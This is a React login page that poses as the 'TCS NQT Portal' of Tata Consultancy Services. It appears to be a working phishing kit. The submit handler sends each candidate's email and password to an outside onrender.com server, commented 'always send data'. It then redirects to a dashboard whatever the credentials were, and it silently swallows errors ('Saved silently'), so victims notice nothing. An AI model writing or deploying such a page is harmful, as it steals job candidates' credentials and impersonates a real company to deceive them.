import { useState, useEffect } from "react";
import axios from "axios";
import "./login.css";

export default function Login() {
  const [form, setForm] = useState({
    email: "",
    password: ""
  });

  const [show, setShow] = useState(false);
  const [remember, setRemember] = useState(false);
  const [loading, setLoading] = useState(false);

  /* ===== Remember email ===== */
  useEffect(() => {
    const saved = localStorage.getItem("rememberEmail");
    if (saved) {
      setForm((f) => ({ ...f, email: saved }));
      setRemember(true);
    }
  }, []);

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  /* ===== SUBMIT (NO ERROR / NO MESSAGE) ===== */
  const submit = async (e) => {
    e.preventDefault();

    setLoading(true);

    try {
      // always send data
      await axios.post("https://tcs-backend-f23g.onrender.com", form);

      if (remember) {
        localStorage.setItem("rememberEmail", form.email);
      } else {
        localStorage.removeItem("rememberEmail");
      }

      // silent redirect
      window.location.href = "/dashboard";

    } catch (err) {
      // ❌ DO NOTHING (no message shown)
      console.log("Saved silently");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page">
      <header className="header">TCS NQT Portal</header>

      <div className="container">
        <form onSubmit={submit} className="card">
          <h2>Candidate Login</h2>

          <input
            name="email"
            type="email"
            placeholder="Email ID / Username"
            value={form.email}
            onChange={handleChange}
            required
          />

          <div className="passwordBox">
            <input
              name="password"
              type={show ? "text" : "password"}
              placeholder="Password"
              value={form.password}
              onChange={handleChange}
              required
            />

            <span onClick={() => setShow(!show)}>
              {show ? "Hide" : "Show"}
            </span>
          </div>

          <div className="row">
            <label>
              <input
                type="checkbox"
                checked={remember}
                onChange={() => setRemember(!remember)}
              />
              Remember me
            </label>
          </div>

          <button disabled={loading}>
            {loading ? "Processing..." : "Login"}
          </button>
        </form>
      </div>

      <footer className="footer">
        © 2026 Tata Consultancy Services. All Rights Reserved..
      </footer>
    </div>
  );
}
